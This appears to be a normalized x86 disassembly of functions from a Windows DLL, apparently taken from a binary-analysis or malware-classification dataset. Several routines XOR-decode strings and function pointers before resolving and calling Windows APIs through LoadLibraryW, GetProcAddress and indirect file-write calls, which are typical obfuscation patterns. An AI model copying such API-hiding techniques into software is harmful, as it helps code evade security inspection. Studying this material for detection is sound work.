mov eax [ fs : 0x0 ]
push eax
sub esp 0x50
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x48 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x60 ]
mov [ fs : 0x0 ] eax
mov edi edx
xor ebx ebx
cmp [ edi + 0x14 ] 0x8
mov esi ecx
mov [ esp + 0x10 ] ebx
jb r-xdata
mov eax edi
mov eax [ edi ]
jmp r-xdata
sbb eax eax
sbb eax 0xffffffff
cmp dx bx
je r-xdata
mov ecx r--data
mov eax [ esi + 0x39c ]
mov [ esp + 0x10 ] eax
inc eax
push 0xd0
mov [ esi + 0x39c ] eax
call sub_1001f84c
add esp 0x4
mov [ esp + 0x14 ] eax
mov [ esp + 0x68 ] 0x1
cmp eax ebx
je r-xdata
lea eax [ esp + 0x10 ]
push eax
call sub_10065cb8
add esp 0x4
cmp eax ebx
je r-xdata
xor eax eax
jmp r-xdata
mov dx [ eax + 0x2 ]
cmp dx [ ecx + 0x2 ]
jne r-xdata
xor edi edi
mov edx [ esp + 0x10 ]
push edi
push edx
push eax
call sub_10064640
mov edi eax
jmp r-xdata
mov ecx [ esp + 0x10 ]
lea edi [ esi + 0x3c0 ]
lea eax [ esp + 0x14 ]
mov [ esp + 0x14 ] ecx
mov [ esp + 0x18 ] ebx
call sub_10023010
inc [ esi + 0x3d0 ]
jmp r-xdata
lea edx [ esp + 0x38 ]
mov eax 0x157
call sub_10045930
xor ecx ecx
mov eax edx
mov [ esp + 0x30 ] 0x7
mov [ esp + 0x2c ] ebx
mov [ esp + 0x1c ] cx
lea edx [ eax + 0x2 ]
lea esp [ esp ]
cmp eax ebx
jne r-xdata
add eax 0x4
add ecx 0x4
cmp dx bx
jne r-xdata
cmp eax [ esi + 0x3a8 ]
jne r-xdata
mov ecx [ esi + 0x3a0 ]
lea edx [ esp + 0x14 ]
cmp ecx edx
ja r-xdata
mov [ esp + 0x68 ] 0xffffffff
mov eax [ esi + 0x3a4 ]
lea ecx [ esp + 0x14 ]
mov [ esp + 0x14 ] edi
cmp ecx eax
jae r-xdata
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0x60 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x48 ]
xor ecx esp
call sub_10001e8b
mov esp ebp
pop ebp
retn
mov cx [ eax ]
add eax 0x2
cmp cx bx
jne r-xdata
sub eax edx
sar eax 0x1
push eax
lea edx [ esp + 0x3c ]
push edx
lea ecx [ esp + 0x24 ]
call sub_1005ddc0
lea edx [ esp + 0x1c ]
mov ecx 0x6
mov [ esp + 0x68 ] ebx
call sub_100205a0
cmp [ esp + 0x30 ] 0x8
jb r-xdata
mov dx [ eax ]
cmp dx [ ecx ]
jne r-xdata
mov eax [ esi + 0x3a4 ]
cmp eax ebx
je r-xdata
lea eax [ esi + 0x3a0 ]
call sub_10035000
mov edi edx
sub edi ecx
sar edi 0x2
cmp eax [ esi + 0x3a8 ]
jne r-xdata
mov eax [ esp + 0x1c ]
push eax
call sub_100187af
add esp 0x4
jmp r-xdata
add [ esi + 0x3a4 ] 0x4
mov [ eax ] edi
mov eax [ esi + 0x3a4 ]
cmp eax ebx
je r-xdata
lea eax [ esi + 0x3a0 ]
call sub_10035000
mov ecx [ esi + 0x3a0 ]
mov edx [ ecx + edi * 4 ]
mov [ eax ] edx
jmp r-xdata
sub_10064e24
push 0x38
mov eax sub_100857f0
call sub_1003fae8
mov eax [ ebp + 0x8 ]
mov esi [ ebp + 0x1c ]
mov edi [ ebp + 0x20 ]
mov ebx [ ebp + 0x24 ]
and [ ebp - 0x38 ] 0x0
mov [ ebp - 0x40 ] eax
lea eax [ ebp - 0x3c ]
mov [ ebp - 0x34 ] ecx
push eax
mov ecx esi
call sub_10013950
mov esi [ esi + 0x14 ]
and [ ebp - 0x4 ] 0x0
push eax
push esi
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x34 ]
call sub_100275d9
or [ ebp - 0x4 ] 0xffffffff
add esp 0x18
lea ecx [ ebp - 0x3c ]
mov esi eax
call sub_10034a80
cmp [ ebp - 0x30 ] 0x2d
lea eax [ ebp - 0x2f ]
je r-xdata
mov [ ebp - 0x34 ] eax
lea eax [ ebp - 0x38 ]
push eax
push esi
lea eax [ ebp - 0x44 ]
push eax
push [ ebp - 0x34 ]
call sub_10060ef0
mov esi eax
add esp 0x10
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_10069d0f
test al al
je r-xdata
lea eax [ ebp - 0x30 ]
mov eax [ ebp - 0x34 ]
cmp [ ebp - 0x44 ] eax
je r-xdata
or [ edi ] 0x1
or [ edi ] 0x2
cmp [ ebp - 0x38 ] 0x0
jne r-xdata
cmp esi 0xffffffff
ja r-xdata
cmp [ ebp - 0x30 ] 0x2d
jne r-xdata
mov [ ebx ] esi
jmp r-xdata
neg esi
mov ecx [ ebp + 0xc ]
mov eax [ ebp - 0x40 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
call sub_1004642f
retn 0x20
sub_10064eef
push 0x38
mov eax sub_1008581d
call sub_1003fae8
mov eax [ ebp + 0x8 ]
mov esi [ ebp + 0x1c ]
mov edi [ ebp + 0x20 ]
mov ebx [ ebp + 0x24 ]
and [ ebp - 0x34 ] 0x0
mov [ ebp - 0x3c ] eax
lea eax [ ebp - 0x38 ]
mov [ ebp - 0x44 ] ecx
push eax
mov ecx esi
call sub_10013950
mov esi [ esi + 0x14 ]
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x34 ]
push ecx
push eax
push esi
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x44 ]
call sub_100424ab
add esp 0x18
push eax
lea eax [ ebp - 0x40 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
call sub_10060ef0
or [ ebp - 0x4 ] 0xffffffff
add esp 0x10
lea ecx [ ebp - 0x38 ]
mov esi eax
call sub_10034a80
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_100463af
test al al
je r-xdata
lea eax [ ebp - 0x30 ]
cmp [ ebp - 0x40 ] eax
je r-xdata
or [ edi ] 0x1
or [ edi ] 0x2
cmp [ ebp - 0x34 ] 0x0
jne r-xdata
mov [ ebx ] esi
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp - 0x3c ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
call sub_1004642f
retn 0x20
sub_10064fa0
push ebp
mov ebp esp
sub esp 0x24
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
push esi
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
push ecx
push 0x0
push ebx
call eax
mov ecx [ ebp - 0x4 ]
add esp 0xc
xor ecx ebp
xor eax eax
pop esi
call sub_10001e8b
mov esp ebp
pop ebp
retn
mov ecx [ r--data ]
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xff97
and edx 0xff
mov [ ebp + eax * 2 - 0x24 ] dx
inc eax
cmp eax 0xa
jb r-xdata
lea ecx [ ebp - 0x24 ]
xor eax eax
push ecx
mov [ ebp - 0x10 ] ax
call [ LoadLibraryW@IAT ]
mov esi eax
test esi esi
jne r-xdata
push edi
lea edi [ ebp - 0xc ]
mov eax 0x6
call sub_100234c0
mov edx edi
push edx
push esi
call [ GetProcAddress@IAT ]
mov [ rw-data ] eax
pop edi
test eax eax
jne r-xdata
lea eax [ esi + 0x1 ]
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
mov eax 0x2
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
sub_10065060
push ebp
mov ebp esp
push 0xffffffff
push sub_10086a93
mov eax [ fs : 0x0 ]
push eax
sub esp 0x180
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x14 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0xc ]
xor ebx ebx
mov edi ecx
mov ecx [ r--data ]
mov [ ebp - 0x158 ] eax
mov [ ebp - 0x140 ] ebx
mov [ ebp - 0x150 ] ebx
xor eax eax
nop
movsx edx [ eax + ecx ]
xor edx eax
xor edx 0xfff7
and edx 0xff
mov [ ebp + eax * 2 - 0x1c ] dx
inc eax
cmp eax 0x2
jb r-xdata
lea ecx [ ebp - 0x150 ]
push ecx
lea edx [ ebp - 0x1c ]
xor eax eax
push edx
mov esi edi
mov [ ebp - 0x18 ] ax
call sub_100724e0
add esp 0x8
test eax eax
je r-xdata
lea edx [ ebp - 0x40 ]
mov eax 0x99
mov [ ebp - 0x148 ] ebx
call sub_10053240
lea eax [ ebp - 0x148 ]
push eax
mov ecx edx
push ecx
call sub_100724e0
add esp 0x8
test eax eax
je r-xdata
lea edx [ ebp - 0xcc ]
mov eax 0x92
call sub_10053240
mov [ ebp - 0x140 ] 0x1
jmp r-xdata
lea edx [ ebp - 0xfc ]
mov eax 0xd0
mov [ ebp - 0x14c ] ebx
call sub_10053240
lea edx [ ebp - 0x14c ]
push edx
lea eax [ ebp - 0xfc ]
push eax
call sub_100724e0
add esp 0x8
test eax eax
je r-xdata
lea edx [ ebp - 0xcc ]
mov eax 0x6f
call sub_10053240
mov [ ebp - 0x140 ] 0x2
jmp r-xdata
mov edx [ ebp - 0x150 ]
mov esi [ SysFreeString@IAT ]
push edx
call esi
mov eax [ ebp - 0x148 ]
push eax
call esi
mov ecx [ ebp - 0x14c ]
push ecx
call esi
mov edx [ ebp - 0x144 ]
push edx
call esi
mov eax [ ebp - 0x184 ]
push eax
call esi
mov ecx [ ebp - 0x188 ]
push ecx
call esi
mov eax [ ebp - 0x140 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn 0xc
lea edx [ ebp - 0x6c ]
mov eax 0xdb
mov [ ebp - 0x144 ] ebx
call sub_10053240
lea ecx [ ebp - 0x144 ]
push ecx
push edx
call sub_100724e0
add esp 0x8
test eax eax
je r-xdata
lea edx [ ebp - 0xd4 ]
mov eax 0xb4
call sub_10053240
lea edx [ ebp - 0x4c ]
mov eax 0x23
mov [ ebp - 0x184 ] ebx
call sub_10053240
lea eax [ ebp - 0x184 ]
push eax
mov ecx edx
push ecx
call sub_100724e0
add esp 0x8
test eax eax
je r-xdata
lea edx [ ebp - 0xd4 ]
mov eax 0x74
call sub_10053240
mov [ ebp - 0x140 ] 0x4
jmp r-xdata
lea edx [ ebp - 0x28 ]
mov eax 0x84
mov [ ebp - 0x188 ] ebx
call sub_10053240
lea edx [ ebp - 0x188 ]
push edx
lea eax [ ebp - 0x28 ]
push eax
call sub_100724e0
add esp 0x8
cmp eax ebx
je r-xdata
lea edx [ ebp - 0xcc ]
mov eax 0x8c
call sub_10053240
mov [ ebp - 0x140 ] 0x5
jmp r-xdata
mov eax [ ebp - 0x184 ]
mov [ ebp - 0x154 ] ebx
cmp eax ebx
je r-xdata
lea edx [ ebp - 0xcc ]
mov eax 0xd8
call sub_10053240
cmp [ ebp + 0x10 ] ebx
je r-xdata
push eax
call sub_10035937
add esp 0x4
mov [ ebp - 0x154 ] eax
xor eax eax
lea esi [ ebp - 0x180 ]
call sub_10022780
xor eax eax
lea esi [ ebp - 0x178 ]
mov [ ebp - 0x4 ] ebx
call sub_10022780
xor eax eax
lea esi [ ebp - 0x160 ]
call sub_10022780
xor eax eax
lea esi [ ebp - 0x170 ]
call sub_10022780
xor eax eax
lea esi [ ebp - 0x168 ]
call sub_10022780
mov [ ebp - 0x4 ] 0x4
mov esi [ ebp - 0x154 ]
cmp esi 0x6
ja r-xdata
lea edx [ ebp - 0x94 ]
mov eax 0x86
call sub_10053240
mov [ ebp - 0x140 ] 0xb
jmp [ esi * 4 + jump_table_100657d8 ]
lea edx [ ebp - 0x9c ]
mov eax 0x87
call sub_10053240
mov [ ebp - 0x140 ] 0x6
jmp r-xdata
lea edx [ ebp - 0x34 ]
mov eax 0x11e
call sub_10053240
mov ecx [ edi ]
mov ecx [ ecx + 0x94 ]
lea edx [ ebp - 0x13c ]
push edx
lea eax [ ebp - 0x34 ]
push eax
push edi
mov [ ebp - 0x13c ] ebx
call ecx
cmp [ ebp - 0x13c ] ebx
je r-xdata
lea edx [ ebp - 0x5c ]
mov eax 0x44
call sub_10053240
mov ecx [ edi ]
mov ecx [ ecx + 0x94 ]
lea edx [ ebp - 0x13c ]
push edx
lea eax [ ebp - 0x5c ]
push eax
push edi
mov [ ebp - 0x13c ] ebx
call ecx
cmp [ ebp - 0x13c ] ebx
je r-xdata
lea edx [ ebp - 0xe8 ]
mov eax 0x45
call sub_10053240
mov ecx [ edi ]
mov ecx [ ecx + 0x94 ]
lea edx [ ebp - 0x13c ]
push edx
lea eax [ ebp - 0xe8 ]
push eax
push edi
mov [ ebp - 0x13c ] ebx
call ecx
cmp [ ebp - 0x13c ] ebx
je r-xdata
lea edx [ ebp - 0x114 ]
mov eax 0x4d
call sub_10053240
mov eax [ edi ]
mov eax [ eax + 0x94 ]
lea ecx [ ebp - 0x13c ]
push ecx
push edx
push edi
mov [ ebp - 0x13c ] ebx
call eax
cmp [ ebp - 0x13c ] ebx
je r-xdata
lea edx [ ebp - 0x138 ]
mov eax 0x107
call sub_10053240
mov edx [ edi ]
mov edx [ edx + 0x94 ]
lea eax [ ebp - 0x13c ]
push eax
lea ecx [ ebp - 0x138 ]
push ecx
push edi
mov [ ebp - 0x13c ] ebx
call edx
cmp [ ebp - 0x13c ] ebx
je r-xdata
push 0x40
push ebx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
cmp [ ebp - 0x180 ] ebx
je r-xdata
lea esi [ ebp - 0x168 ]
mov [ ebp - 0x4 ] 0x3
call sub_100524c0
lea esi [ ebp - 0x170 ]
mov [ ebp - 0x4 ] 0x2
call sub_100524c0
lea esi [ ebp - 0x160 ]
mov [ ebp - 0x4 ] 0x1
call sub_100524c0
lea edi [ ebp - 0x178 ]
call sub_1004cac0
lea edi [ ebp - 0x180 ]
mov [ ebp - 0x4 ] 0xffffffff
call sub_1004b790
lea edx [ ebp - 0xc4 ]
mov eax 0x29
call sub_10053240
mov [ ebp - 0x140 ] 0x7
jmp r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ ebp - 0x180 ]
push edx
push eax
lea ecx [ ebp - 0x13c ]
call sub_10072390
cmp eax ebx
je r-xdata
lea edx [ ebp - 0xc4 ]
mov eax 0x120
call sub_10053240
mov [ ebp - 0x140 ] 0x8
jmp r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ ebp - 0x13c ]
push edx
push eax
lea ebx [ ebp - 0x178 ]
call sub_10020110
test eax eax
je r-xdata
lea edx [ ebp - 0xd4 ]
mov eax 0x80
call sub_10053240
mov [ ebp - 0x140 ] 0x9
jmp r-xdata
mov edx [ ebp + 0x8 ]
push edx
lea ecx [ ebp - 0x13c ]
lea edi [ ebp - 0x160 ]
call sub_10036dc0
cmp eax ebx
je r-xdata
lea edx [ ebp - 0xd4 ]
mov eax 0x10
call sub_10053240
mov [ ebp - 0x140 ] 0xa
jmp r-xdata
mov ecx [ ebp + 0x8 ]
push ecx
lea ecx [ ebp - 0x13c ]
lea edi [ ebp - 0x170 ]
call sub_10053c40
cmp eax ebx
je r-xdata
mov [ ebp - 0x140 ] 0xa
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0x13c ]
lea edi [ ebp - 0x168 ]
call sub_10071140
cmp eax ebx
je r-xdata
cmp [ ebp - 0x178 ] ebx
je r-xdata
mov [ ebp - 0x154 ] eax
mov [ ebp - 0x4 ] 0x5
cmp eax ebx
je r-xdata
mov esi [ ebp - 0x154 ]
xor ebx ebx
cmp [ ebp - 0x160 ] ebx
je r-xdata
mov edi eax
cmp edi ebx
je r-xdata
mov edx [ ebp - 0x158 ]
xor eax eax
mov [ edx ] eax
jmp r-xdata
mov edx [ ebp - 0x144 ]
lea ecx [ ebp - 0x180 ]
push ecx
mov ecx [ ebp - 0x14c ]
push esi
push edx
mov edx [ ebp - 0x148 ]
push ecx
mov ecx [ ebp - 0x150 ]
push edx
push ecx
push eax
call sub_10007c70
mov edx [ ebp - 0x158 ]
mov [ edx ] eax
jmp r-xdata
cmp [ ebp - 0x170 ] ebx
je r-xdata
mov [ ebp - 0x154 ] eax
mov [ ebp - 0x4 ] 0x6
cmp eax ebx
je r-xdata
mov ecx [ ebp - 0x144 ]
mov edx [ ebp - 0x14c ]
lea eax [ ebp - 0x178 ]
push eax
mov eax [ ebp - 0x148 ]
push ecx
mov ecx [ ebp - 0x150 ]
push edx
push eax
push ecx
mov eax esi
call sub_1006fe30
mov edx [ ebp - 0x158 ]
mov [ edx ] eax
jmp r-xdata
cmp [ ebp - 0x168 ] ebx
je r-xdata
mov [ ebp - 0x154 ] eax
mov [ ebp - 0x4 ] 0x7
cmp eax ebx
je r-xdata
mov edx [ ebp - 0x144 ]
lea ecx [ ebp - 0x160 ]
push ecx
mov ecx [ ebp - 0x14c ]
push esi
push edx
mov edx [ ebp - 0x148 ]
push ecx
mov ecx [ ebp - 0x150 ]
push edx
push ecx
push eax
call sub_1005abd0
mov edx [ ebp - 0x158 ]
mov [ edx ] eax
jmp r-xdata
mov ecx eax
cmp ecx ebx
je r-xdata
mov [ ebp - 0x154 ] eax
mov [ ebp - 0x4 ] 0x8
cmp eax ebx
je r-xdata
mov edx [ ebp - 0x144 ]
lea ecx [ ebp - 0x170 ]
push ecx
mov ecx [ ebp - 0x14c ]
push esi
push edx
mov edx [ ebp - 0x148 ]
push ecx
mov ecx [ ebp - 0x150 ]
push edx
push ecx
push eax
call sub_1006ccb0
mov edx [ ebp - 0x158 ]
mov [ edx ] eax
jmp r-xdata
xor eax eax
mov eax [ ebp - 0x188 ]
mov edx [ ebp - 0x144 ]
push eax
mov eax [ ebp - 0x14c ]
push edx
mov edx [ ebp - 0x148 ]
push eax
mov eax [ ebp - 0x150 ]
push edx
push eax
mov eax esi
call sub_100314a0
jmp r-xdata
mov edx [ ebp - 0x144 ]
lea ecx [ ebp - 0x168 ]
push ecx
mov ecx [ ebp - 0x14c ]
push esi
push edx
mov edx [ ebp - 0x148 ]
push ecx
mov ecx [ ebp - 0x150 ]
push edx
push ecx
push eax
call sub_10046210
mov edx [ ebp - 0x158 ]
mov [ edx ] eax
jmp r-xdata
mov ecx [ ebp - 0x158 ]
mov [ ecx ] eax
lea edx [ ebp - 0xa8 ]
mov eax 0x2
call sub_10053240
jmp r-xdata
sub_10065800
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
push esi
mov esi ecx
mov ecx [ ebp + 0xc ]
push ecx
xor eax eax
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
push edx
mov ecx esi
mov [ esi ] ax
call sub_1005ddc0
mov eax esi
pop esi
pop ebp
retn 0x8
sub_10065830
push ebp
mov ebp esp
push 0xfffffffe
push r--data
push sub_10057d80
mov eax [ fs : 0x0 ]
push eax
sub esp 0x248
mov eax [ rw-data ]
xor [ ebp - 0x8 ] eax
xor eax ebp
mov [ ebp - 0x1c ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x18 ] esp
mov esi [ rw-data ]
mov [ ebp - 0x240 ] esi
xor edx edx
mov [ ebp - 0x238 ] edx
xor eax eax
mov ecx [ r--data ]
movsx edi [ ecx + eax ]
xor edi eax
xor edi 0x45
and edi 0xff
mov [ ebp + eax * 2 - 0x30 ] di
inc eax
cmp eax 0x9
jb r-xdata
xor eax eax
mov [ ebp - 0x1e ] ax
mov [ ebp - 0x4 ] edx
mov ecx [ esi + 0x120 ]
mov edx [ ecx + 0x10 ]
mov [ ebp - 0x234 ] edx
lea ebx [ esi + 0xfa8 ]
mov [ ebp - 0x258 ] ebx
lea eax [ esi + 0xda0 ]
mov [ ebp - 0x248 ] eax
push eax
mov edi [ lstrlenW@IAT ]
call edi
push ebx
mov [ ebp - 0x230 ] eax
call edi
mov ecx [ ebp - 0x230 ]
add ecx eax
mov [ ebp - 0x230 ] ecx
lea ebx [ esi + 0xd7c ]
push ebx
call edi
add eax [ ebp - 0x230 ]
mov [ ebp - 0x230 ] eax
lea eax [ esi + 0xd5c ]
mov [ ebp - 0x250 ] eax
push eax
call edi
add eax [ ebp - 0x230 ]
mov [ ebp - 0x230 ] eax
lea eax [ esi + 0xb4c ]
mov [ ebp - 0x23c ] eax
push eax
call edi
add eax [ ebp - 0x230 ]
mov [ ebp - 0x230 ] eax
lea eax [ esi + 0x944 ]
mov [ ebp - 0x244 ] eax
push eax
call edi
add eax [ ebp - 0x230 ]
mov [ ebp - 0x230 ] eax
lea eax [ esi + 0x73c ]
mov [ ebp - 0x254 ] eax
push eax
call edi
add eax [ ebp - 0x230 ]
mov [ ebp - 0x230 ] eax
lea eax [ esi + 0x124 ]
mov [ ebp - 0x24c ] eax
push eax
call edi
add eax [ ebp - 0x230 ]
mov [ ebp - 0x230 ] eax
lea eax [ ebp - 0x30 ]
push eax
call edi
add eax [ ebp - 0x230 ]
mov ecx [ ebp - 0x234 ]
lea eax [ eax + ecx + 0x104 ]
mov [ ebp - 0x234 ] eax
lea edx [ eax + eax ]
push edx
push 0x8
mov eax [ esi ]
push eax
call [ HeapAlloc@IAT ]
mov edi eax
mov [ ebp - 0x238 ] edi
test edi edi
jne r-xdata
lea edx [ ebp - 0x3c ]
mov eax 0x25
call sub_10049e00
lea edx [ ebp - 0x22c ]
mov eax 0x16
call sub_10049e00
cmp [ esi + 0xd58 ] 0x0
lea ecx [ ebp - 0x3c ]
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
jmp r-xdata
mov eax [ esi + 0x120 ]
cmp [ eax + 0x14 ] 0x8
jb r-xdata
lea ecx [ ebp - 0x30 ]
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x1c ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x258 ]
push edx
mov edx [ ebp - 0x248 ]
push edx
push ebx
mov edx [ ebp - 0x250 ]
push edx
push ecx
mov ecx [ ebp - 0x23c ]
push ecx
mov edx [ ebp - 0x244 ]
push edx
mov ecx [ ebp - 0x254 ]
push ecx
mov edx [ ebp - 0x24c ]
push edx
push eax
lea eax [ ebp - 0x22c ]
push eax
mov ecx [ ebp - 0x234 ]
mov ebx edi
call sub_1002cb70
add esp 0x2c
jmp r-xdata
mov eax [ eax ]
mov [ ebp - 0x4 ] 0xfffffffe
mov eax edi
sub_10065a5e
mov esp [ ebp - 0x18 ]
mov eax [ ebp - 0x238 ]
test eax eax
je r-xdata
xor edi edi
mov [ ebp - 0x238 ] edi
mov [ ebp - 0x4 ] 0xfffffffe
mov eax edi
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x1c ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
push eax
push 0x0
mov ecx [ ebp - 0x240 ]
mov edx [ ecx ]
push edx
call [ HeapFree@IAT ]
sub_10065ab0
push ebp
mov ebp esp
push 0xffffffff
push sub_100889cc
mov eax [ fs : 0x0 ]
push eax
sub esp 0x38
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi [ ebp + 0x8 ]
mov eax [ ebp + 0xc ]
mov esi edx
mov [ ebp - 0x44 ] esi
mov [ ebp - 0x40 ] edi
mov [ ebp - 0x3c ] eax
mov [ ebp - 0x34 ] ecx
call sub_100202e0
lea edi [ esi + 0x70 ]
mov eax 0x7
xor ebx ebx
xor edx edx
mov [ edi + 0x14 ] eax
mov [ edi + 0x10 ] ebx
mov [ edi ] dx
mov [ ebp - 0x4 ] ebx
mov [ esi ] r--data
mov [ esi + 0x90 ] ebx
mov [ esi + 0xa8 ] eax
xor eax eax
mov [ esi + 0xa4 ] ebx
mov [ esi + 0x94 ] ax
mov [ esi + 0xb0 ] ebx
mov [ esi + 0xb4 ] ebx
mov [ esi + 0xb8 ] ebx
mov [ esi + 0xbc ] ebx
mov ecx esi
mov [ ebp - 0x4 ] 0x2
call sub_1005c930
cmp [ edi + 0x14 ] 0x8
jb r-xdata
mov ecx [ rw-data ]
push ebx
push 0x80
push 0x4
push ebx
push ebx
mov [ ebp - 0x30 ] ecx
xor [ ebp - 0x30 ] 0x38
xor [ ebp - 0x2f ] 0x38
xor [ ebp - 0x2e ] 0x38
xor [ ebp - 0x2d ] 0x38
push 0x60000000
push edi
call [ ebp - 0x30 ]
mov edi eax
cmp edi 0xffffffff
je r-xdata
mov edi [ edi ]
mov eax [ ebp - 0x40 ]
mov eax [ eax + 0x54 ]
cmp eax ebx
je r-xdata
push ebx
push ebx
push ebx
push edi
call [ SetFilePointer@IAT ]
mov edx [ rw-data ]
mov ecx [ ebp - 0x34 ]
push ebx
mov [ ebp - 0x30 ] edx
mov edx [ ebp - 0x3c ]
xor [ ebp - 0x30 ] 0x38
xor [ ebp - 0x2f ] 0x38
xor [ ebp - 0x2e ] 0x38
xor [ ebp - 0x2d ] 0x38
lea eax [ ebp - 0x38 ]
push eax
push ecx
push edx
push edi
call [ ebp - 0x30 ]
mov eax [ rw-data ]
mov [ ebp - 0x30 ] eax
xor [ ebp - 0x30 ] 0x38
xor [ ebp - 0x2f ] 0x38
xor [ ebp - 0x2e ] 0x38
xor [ ebp - 0x2d ] 0x38
push edi
call [ ebp - 0x30 ]
mov edx [ ebp - 0x34 ]
xor ecx ecx
cmp [ ebp - 0x38 ] edx
sete cl
mov [ esi + 0x8 ] ecx
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn 0x8
mov [ ebp - 0x30 ] eax
mov cx [ eax ]
add eax 0x2
cmp cx bx
jne r-xdata
sub eax edi
sar eax 0x1
push eax
push edx
lea ecx [ ebp - 0x2c ]
call sub_1005ddc0
lea ecx [ ebp - 0x2c ]
push ecx
lea ecx [ esi + 0xb4 ]
mov [ ebp - 0x4 ] 0x3
call sub_10006d30
mov [ ebp - 0x4 ] 0x2
cmp [ ebp - 0x18 ] 0x8
jb r-xdata
mov eax [ ebp - 0x30 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x30 ] eax
cmp eax ebx
jne r-xdata
mov edx [ ebp - 0x2c ]
push edx
call sub_100187af
add esp 0x4
mov ecx [ ebp - 0x30 ]
mov edx [ ecx ]
mov edx [ edx + 0x4 ]
xor eax eax
mov [ ebp - 0x2c ] ax
mov eax edx
mov [ ebp - 0x18 ] 0x7
mov [ ebp - 0x1c ] ebx
lea edi [ eax + 0x2 ]
sub_10065cb8
mov edi edi
push ebp
mov ebp esp
push ecx
push esi
push [ rw-data ]
call [ DecodePointer@IAT ]
mov esi eax
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
and [ eax ] 0x0
push edi
test esi esi
jne r-xdata
call sub_1006299d
push 0x16
pop esi
mov [ eax ] esi
call sub_100427ff
mov eax esi
jmp r-xdata
push 0x4
push [ ebp + 0x8 ]
call esi
test eax eax
jne r-xdata
push r--data
call [ LoadLibraryW@IAT ]
mov [ ebp - 0x4 ] eax
test eax eax
jne r-xdata
pop esi
leave
retn
xor eax eax
call sub_1006299d
mov [ eax ] 0xc
call sub_1006299d
mov eax [ eax ]
jmp r-xdata
push r--data
push eax
call [ GetProcAddress@IAT ]
mov esi eax
test esi esi
jne r-xdata
call sub_1006299d
push 0x16
pop esi
mov [ eax ] esi
call sub_100427ff
mov eax esi
jmp r-xdata
pop edi
push ebx
push esi
call [ EncodePointer@IAT ]
mov edi eax
call sub_10053997
push edi
push rw-data
mov ebx eax
call [ InterlockedExchange@IAT ]
cmp eax ebx
pop ebx
je r-xdata
call sub_1006299d
mov esi [ GetLastError@IAT ]
mov edi eax
call esi
push eax
call sub_10053281
pop ecx
mov [ edi ] eax
call sub_100427ff
call esi
push eax
call sub_10053281
pop ecx
jmp r-xdata
push [ ebp - 0x4 ]
call [ FreeLibrary@IAT ]
sub_10065da8
push 0x30
mov eax sub_1008613d
call sub_1003fae8
mov eax [ ebp + 0x18 ]
mov edi [ ebp + 0x8 ]
mov [ ebp - 0x38 ] eax
mov eax [ ebp + 0x20 ]
cmp [ eax + 0x14 ] 0x10
mov [ ebp - 0x34 ] ecx
jb r-xdata
xor ebx ebx
cmp [ eax ] 0x2d
mov [ ebp - 0x30 ] bl
jne r-xdata
mov eax [ eax ]
mov cl [ eax ]
xor esi esi
jmp r-xdata
mov [ ebp - 0x30 ] 0x1
inc eax
cmp cl 0x30
jge r-xdata
cmp cl 0x39
jg r-xdata
push esi
push eax
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x18 ] 0xf
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x2c ] bl
call sub_10037e00
